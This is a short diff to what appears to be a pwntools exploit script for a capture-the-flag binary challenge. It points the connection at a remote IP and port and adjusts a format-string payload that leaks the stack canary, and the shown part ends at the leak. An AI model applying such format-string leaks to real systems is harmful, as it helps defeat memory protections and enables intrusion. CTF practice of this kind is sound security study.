@@ -1,13 +1,13 @@
 from pwn import *
 
-io = process("./chal")
-# io = remote("0.0.0.0",1005)
+# io = process("./chal")
+io = remote("35.228.220.66",1301)
 elf = ELF("./chal")
 r = ROP("./chal")
 
 io.recvline()
 
-io.sendlineafter(": ","%11$p")  #leaking the canary
+io.sendlineafter(": ","%9$p")  #leaking the canary
 io.recvline()
 leak = int(io.recvline().strip(),16)   
 
